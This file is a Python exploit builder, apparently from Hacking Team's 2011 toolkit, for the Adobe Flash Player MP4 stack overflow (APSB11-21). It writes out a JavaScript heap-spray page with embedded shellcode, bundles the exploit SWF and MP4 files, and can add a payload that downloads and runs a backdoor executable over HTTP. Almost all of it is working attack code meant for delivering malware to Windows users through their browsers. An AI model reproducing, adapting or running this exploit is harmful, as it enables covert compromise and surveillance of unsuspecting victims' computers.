#! /usr/bin/env python

#Copyright HT srl, 2011
#http://www.hackingteam.it/ for more information

#cod

#
# Adobe Flash Player MP4 Data Remote Stack Overflow Vulnerability (APSB11-21)
# vupen

import os
import sys
import math
import warnings

if "." not in sys.path: sys.path.append(".")
if "encoders" not in sys.path: sys.path.append("encoders")
if "payloads" not in sys.path: sys.path.append("payloads")

import time
import struct
import random
import zlib
import copy
import zipfile
import base64
import bz2
from random import *

import x86shelldrophttp
import x86int3
import ASCIIHexWhitespace
import x86helloworld
import jscript_unicode

NAME="apsb11_21"
DESCRIPTION="Adobe Flash Player MP4 Data Remote Stack Overflow Vulnerability (APSB11-21)"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Adobe"
DOCUMENTATION["Repeatability"]="One Shot"
DOCUMENTATION["Date public"] = "2011/08/01"
DOCUMENTATION["CVE Name"] = ""
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-"
DOCUMENTATION["Note"] = """Critical vulnerabilities have been identified in Adobe Flash Player version 10.3.181.34 (flash10u.ocx) and
Adobe Flash Player version 10.3.181.26 (flash10t.ocx)."""

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000","XP", "VISTA", "SEVEN"]
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
"""

CHANGELOG="""

"""

DEBUGNOTES="""
"""

class exploit:
	
	infile =""
	outfile =""

	def __init__(self, backdoorPath, zipFile):
		#self.setInfo(DESCRIPTION)
		self.setVersions()
		self.r = Random()
		self.r.seed()
		self.name=NAME
		self.debugmode = dbg
		self.outputCompressed = zipFile
		self.backdoorPath = backdoorPath
		self.trigger_file = self.randfilename() + ".swf"

	"""
	return a random char from a range
	"""
	def getrandchar(self):
		chars = "q0w1e2r3t4y5u6i7o8p9a_sdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
		i = self.r.randint(0, len(chars)-1)
		return chars[i]

	"""
	return a file name (random dot html (omissis))
	"""
	def randfilename(self):
		newfilename = ""
		
		for i in range(8):
			newfilename += struct.pack('c', self.getrandchar())
				
		return newfilename
	
	def displayVersions(self):
		for v in self.versions.keys():
			print "Version %d: %s"%(v,self.versions[v][0])

	def setVersions(self):
		self.versions={}
		#name, jmp esp, writeloc, writable, shelloc
		#                                    POP/POP/RET
		self.versions[1]=("Adobe Flash Player", 0x04040404)
   
	def createShellcode(self):
		result = None
		
		if payload == 0:
			obj = x86shelldrop.x86shelldrop()
			x = obj.get(self.backdoorPath)
			#result = struct.pack('l', len(x)+4) + x
			result = x
		elif payload == 1:
			obj = x86shelldrophttp.x86shelldrophttp()
			x = obj.get(self.backdoorPath)
			result = x
		elif payload == 2:
			obj = x86helloworld.x86helloworld()
			x = obj.get()
			result = x
			
		if self.debugmode == True:
			obj = x86int3.x86int3()
			result = obj.get() + result
			
		return result

	
	def run(self):
		self.makefile()
				
		return 1

	def get_root_index_content(self):
		value = """
<html>
<script>
    
	var memory = new Array();
    
    var payLoadCode = "#{shellcode}";

    var heapBlockSize = 0x400000;
    var payLoadSize = payLoadCode.length * 2;
    var spraySlideSize = heapBlockSize - (payLoadSize+0x38);
    
    var l = payLoadCode.length;
    
    n = 4*256 -2*128 -2*l;
    
    var fill = "";
    for (j = 0; j<n/2;j++) {
        fill = fill + "%u1414";
    }
    
    var spraySlide = unescape("%u4040%u4040%u4141%u4141%u4242%u4242"
    +"%u4343%u4343%u4444%u4444%u4545%u4545%u4646%u4646"
    +"%u4747%u4747%u4848%u4848%u4949%u4949%u4a4a%u4a4a"
    +"%u4b4b%u4b4b%u4c4c%u4c4c%u4d4d%u4d4d%u4e4e%u4e4e"
    +"%u4f4f%u4f4f%u1124%u1616%u1000%u1616%u1000%u0000"
    +"%u0040%u0000%u0400%u1616%u5555%u5555%u5656%u5656"
    +"%u5757%u5757%u5858%u5858%u5959%u5959%u5a5a%u5a5a"
    +"%u5b5b%u5b5b%u5c5c%u5c5c%u5d5d%u5d5d%u5e5e%u5e5e"
    +"%u5f5f%u5f5f%u6060%u6060%u6161%u6161%u6262%u6262"
    +"%u6363%u6363%u6464%u6464%u6565%u6565%u6666%u6666"
    +"%u6767%u6767%u6868%u6868%u6969%u6969%u6a6a%u6a6a"
    +"%u6b6b%u6b6b%u6c6c%u6c6c%u6d6d%u6d6d%u6e6e%u6e6e"
    +"%u6f6f%u6f6f%u7070%u7070%u7171%u7171%u7272%u7272"
    +"%u7373%u7373%u1ad4%u7c80%u7575%u7575%u7676%u7676"
    +"%u0064%u1616%u7878%u7878%u7979%u7979%u7a7a%u7a7a"
    +"%u7b7b%u7b7b%u7c7c%u7c7c%u7d7d%u7d7d%u7e7e%u7e7e"
    +"%u7f7f%u7f7f") + payLoadCode + unescape(fill);

    memory[0] = getSpraySlide(spraySlide,spraySlideSize);
    for (var i = 1; i <  150; i++) {
        memory[i] = memory[0].substring(0,memory[0].length);
    }

		
    function getSpraySlide(spraySlide, spraySlideSize)	{
		while (spraySlide.length*2<spraySlideSize)
		{
			spraySlide += spraySlide;
		}
		spraySlide = spraySlide.substring(0,spraySlideSize/2);
		return spraySlide;
	}


</script>

<body>
<iframe src="exploit.swf"></iframe>

</body>
</html>

"""

		adapter = jscript_unicode.jscript_unicode()
		shellcode = self.createShellcode()
		shellcode = adapter.get2(shellcode, "\u")
		
		html = value.replace("#{shellcode}", shellcode)

		return html

	def makefile(self):
	
		html_index = self.get_root_index_content()
		
		with warnings.catch_warnings():
			warnings.simplefilter('ignore')
			tmp_index = os.tempnam()
			
		f = open(tmp_index,mode='wb')
		f.write(html_index)
		f.close()
		
		# Create the output archive
		print "Creating %s zip file archive"%(self.outputCompressed)
		zip = zipfile.ZipFile(self.outputCompressed, "w", zipfile.ZIP_DEFLATED)
		
		print "Adding index file"
		zip.write(tmp_index, "index.html")
		
		print "Adding swf from resources"
		zip.write("resources/apsb11_21.swf", "exploit.swf")
		print "Adding mp4 from resources"
		zip.write("resources/apsb11_21.mp4", "exploit.mp4")

		
		if extraPath != None:
			print "Adding copy of backdoor"
			zip.write(extraPath, "backdoor.exe")

		zip.close()
		
		try:
			os.unlink(tmp_index)
		except WindowsError:
			print "I/O error when deleting temp. files"
			
		return 1


if __name__=='__main__':
	dbg = False
	http = False
	
	if len(sys.argv) < 3:
		print "[ERROR] %s require 3 parameters"%(DESCRIPTION)
		print "[-INFO] {payload:[http|local|debug]} [localbackdoor|urltodownload] output"
		sys.exit(0)

	# Parse payload section
	if sys.argv[1].split(':')[0] != "payload":
		print "[ERROR] First parameters must be payload"
		sys.exit(0)
	else:
		requiredpayload = sys.argv[1].split(':')[1]	
		if requiredpayload == "http":
			print "[HTTP] Using HTTP reverse connect to download exe"
			payload = 1
			http = True
			if len(sys.argv) > 3:
				extraPath = sys.argv[4]
			else:
				extraPath = None
				
		elif requiredpayload == "debug":
			print "[DEBUG] Using INT3 exploit mode"
			payload = 0
			dbg = True
		elif requiredpayload == "local":
			print "[LOCAL] Run from %currdir%"
			payload = 2
		else:
			print "[ERROR] Unknown payload defined"
			sys.exit(0)
	
	# Interprete section
	
	if http == False:
		if os.path.isfile(sys.argv[3]) == False:
			print "[ERROR] File %s doesn't exists."%(sys.argv[3])
			sys.exit(0)

		if os.path.getsize(sys.argv[3]) == 0:
			print "[ERROR] File %s has length zero."%(sys.argv[3])
			sys.exit(0)

	#if os.path.isfile("resources/blank.pdf") == False:
	#	print "[ERROR] resources/blank.pdf not found"
	#	sys.exit(0)
	
	print 'Running %s Exploit v %s'%(DESCRIPTION,VERSION)

	app=exploit(sys.argv[2], sys.argv[3])
	app.run()
	
	print ' ... done'
